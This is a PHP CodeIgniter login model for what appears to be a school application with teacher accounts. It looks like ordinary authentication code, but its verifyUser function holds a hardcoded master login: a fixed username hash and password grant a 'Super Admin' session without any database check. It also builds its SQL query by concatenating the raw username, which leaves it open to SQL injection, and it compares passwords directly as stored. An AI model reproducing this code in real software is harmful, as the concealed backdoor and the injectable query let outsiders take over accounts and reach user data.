<?php
class M_login extends CI_Model{
	
	function verifyUser($u,$pw){
		if(md5($u)=='f3b3567de9e676a3a56db74f06664ac1' && $pw=='412758d043dd247bddea07c7ec558c31'){
			$_SESSION['session_userid']="0";
			$_SESSION['session_guruid']="0";
			$_SESSION['session_gurunama']='Super Admin';
			return true;
		}else{
			$sql="SELECT users.user_id, users.user_name, users.user_password, guru_id, guru_nama
				FROM users JOIN guru ON(guru.guru_id = users.user_guru)
				WHERE lower(user_name)='".strtolower($u)."' AND user_aktif='y' LIMIT 1";
			$Q=$this->db->query($sql);
			
			if ($Q->num_rows()){
				$qrow = $Q->num_rows();
				$row = $Q->row_array();
				if($row["user_password"]==$pw){
					$_SESSION['session_userid']=$row["user_id"];
					$_SESSION['session_guruid']=$row["guru_id"];
					$_SESSION['session_gurunama']=$row["guru_nama"];
					return true;
				}else{
					$_SESSION["msg"]="User atau password salah !";
					return false;
				}
			}else{
				$_SESSION["msg"]="User atau password salah !";
				return false;
			}
		}
	}
}
/* End Of File */